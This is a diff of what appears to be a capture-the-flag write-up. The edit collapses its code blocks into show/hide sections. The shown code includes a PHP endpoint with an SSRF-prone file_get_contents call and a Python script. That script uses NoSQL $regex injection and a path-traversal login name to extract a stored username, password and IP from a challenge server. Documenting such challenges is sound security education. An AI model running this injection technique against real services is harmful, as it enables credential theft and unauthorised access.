@@ -148,40 +148,45 @@ And we got a hit!
 
 Looking at the response we got, here is `guinjutsu.php` content:
 
-```php
-<?php
-// This endpoint is deprecated due to some problems, I heard that other clans have stolen some jutsus
-function check($url){
-    $par=parse_url($url);
-    if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000)){
-        return True;
+<details>
+	<summary>Show</summary>
+	
+	```php
+	<?php
+	// This endpoint is deprecated due to some problems, I heard that other clans have stolen some jutsus
+	function check($url){
+	    $par=parse_url($url);
+	    if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000)){
+		return True;
 
-    }
-    else{
-        return False;
-    }
+	    }
+	    else{
+		return False;
+	    }
 
-}
-if (isset($_POST['submit'])){
-    if ((isset($_POST['api']))and(isset($_POST['endpoint']))){
-        $url=$_POST['api'].$_POST['endpoint'];
-        if (check($url)){
-            $opts = array(
-			  'http'=>array(
-				'method'=>"GET",
-				'follow_location'=>false,
-				'header'=>"Accept-language: en\r\n" 
-			  )
-			);
-			$context = stream_context_create($opts);
-			$file = file_get_contents($url, false, $context);
-			echo $file;
+	}
+	if (isset($_POST['submit'])){
+	    if ((isset($_POST['api']))and(isset($_POST['endpoint']))){
+		$url=$_POST['api'].$_POST['endpoint'];
+		if (check($url)){
+		    $opts = array(
+				  'http'=>array(
+					'method'=>"GET",
+					'follow_location'=>false,
+					'header'=>"Accept-language: en\r\n" 
+				  )
+				);
+				$context = stream_context_create($opts);
+				$file = file_get_contents($url, false, $context);
+				echo $file;
 
+			}
 		}
 	}
-}
-?>
-```
+	?>
+	```
+	
+</details>
 
 We can see that this is somekind of an API & we got a `file_get_contents` here! We can see that the `$url` is the concatination of `api` & `endpoint` params of POST so
 we have full control over this variable. This looks interesting since the `$url` is passed to `file_get_contents` but we can see some kind of verification before reaching 
@@ -418,81 +423,84 @@ Which will cause the `query` to be the following<br/>
 And we get our expected answer, "Service is UP". So how can we exploit this now ?<br/>
 I made a short python script that logins to the website & tries to guess the password using regular expressions, we can include a regex in our query by using the "$regex" operator. So what's our plan? We can start guessing the username value one character at a time, using the `^` operator for the regular expressions, as example, we can use `^[a-z]{1}.*` to match any service that have a username which starts with a character from a to z, we can start by lowercase characters & lower our interval till we reach a specific character, if no match we can go for the uppercase characters.
 
-So after a little work, I got the following script: 
+So after a little work, I got the following script: ( [Ref](/2021/YogoshaChristmas/files/NoSQL%20Injection.py) )
 
-```python
-import requests
-
-
-def checkInterval(sess, minC, maxC, attribute, crackedValue):
-    if minC != maxC:
-        regex = "^"+crackedValue+"["+minC+"-"+maxC+"].*"
-    else:
-        regex = "^"+crackedValue+"["+minC+"].*" # Check for one specific character
-        
-    payload = '", "'+attribute+'":{"$regex":"'+regex+'"}, "Service": "ssh'
-    
-    resp = sess.post('http://3.141.109.49/services', data={'service': payload})
-    if resp.content.find('Service is UP') != -1: # we got a hit
-        return True
-    else:
-        return False
+<details>
+	<summary>Show</summary>
+	```python
+	import requests
 
 
-def findCharInRange(sess, minC, maxC, attribute, crackedValue):
-    if minC == maxC:
-        # Testing on a single character
-        maxC = chr(ord(maxC)+1) # This should always give the same middle character, which is the character itself.
-        
-    while minC != maxC:
-        middle = chr((ord(minC) + ord(maxC))/2)
+	def checkInterval(sess, minC, maxC, attribute, crackedValue):
+	    if minC != maxC:
+		regex = "^"+crackedValue+"["+minC+"-"+maxC+"].*"
+	    else:
+		regex = "^"+crackedValue+"["+minC+"].*" # Check for one specific character
 
-        if checkInterval(sess, minC, middle, attribute, crackedValue):
-            maxC = middle
-        else:
-            minC = chr(ord(middle)+1)
-    
-    return minC if checkInterval(sess, minC, minC, attribute, crackedValue) else False
+	    payload = '", "'+attribute+'":{"$regex":"'+regex+'"}, "Service": "ssh'
+
+	    resp = sess.post('http://3.141.109.49/services', data={'service': payload})
+	    if resp.content.find('Service is UP') != -1: # we got a hit
+		return True
+	    else:
+		return False
 
 
-def crackAttribute(sess, attribute, ip=False):
-    """
-        We add an ip variable in order to avoid checking for alphabet characters in an IP, useless.
-    """
-    value = ''
-    while True:
-        if ip:
-            result = findCharInRange(sess, '0', '9', attribute, value)
-            if result:
-                value += result
-            else:
-                result = findCharInRange(sess, '.', '.', attribute, value)
-                if result:
-                    value += result
-                else:
-                    break
-            
-            continue
-        
-        result = findCharInRange(sess, 'a', 'z', attribute, value)
-        if result:
-            value += result
-        else:
-            result = findCharInRange(sess, 'A', 'Z', attribute, value)
-            if result:
-                value += result
-            else:
-                break
-                
-    return value
+	def findCharInRange(sess, minC, maxC, attribute, crackedValue):
+	    if minC == maxC:
+		# Testing on a single character
+		maxC = chr(ord(maxC)+1) # This should always give the same middle character, which is the character itself.
 
-sess = requests.session()
-sess.post('http://3.141.109.49/login', data={'username': '../jutsu/1#'}) # Login
+	    while minC != maxC:
+		middle = chr((ord(minC) + ord(maxC))/2)
 
-print 'Username: ' + crackAttribute(sess, 'username')
-print 'Password: ' + crackAttribute(sess, 'password')
-print 'IP: ' + crackAttribute(sess, 'IP', True)
-```
+		if checkInterval(sess, minC, middle, attribute, crackedValue):
+		    maxC = middle
+		else:
+		    minC = chr(ord(middle)+1)
+
+	    return minC if checkInterval(sess, minC, minC, attribute, crackedValue) else False
+
+
+	def crackAttribute(sess, attribute, ip=False):
+	    """
+		We add an ip variable in order to avoid checking for alphabet characters in an IP, useless.
+	    """
+	    value = ''
+	    while True:
+		if ip:
+		    result = findCharInRange(sess, '0', '9', attribute, value)
+		    if result:
+			value += result
+		    else:
+			result = findCharInRange(sess, '.', '.', attribute, value)
+			if result:
+			    value += result
+			else:
+			    break
+
+		    continue
+
+		result = findCharInRange(sess, 'a', 'z', attribute, value)
+		if result:
+		    value += result
+		else:
+		    result = findCharInRange(sess, 'A', 'Z', attribute, value)
+		    if result:
+			value += result
+		    else:
+			break
+
+	    return value
+
+	sess = requests.session()
+	sess.post('http://3.141.109.49/login', data={'username': '../jutsu/1#'}) # Login
+
+	print 'Username: ' + crackAttribute(sess, 'username')
+	print 'Password: ' + crackAttribute(sess, 'password')
+	print 'IP: ' + crackAttribute(sess, 'IP', True)
+	```
+</details>
 
 Might take few seconds to run but we still get our results:
 
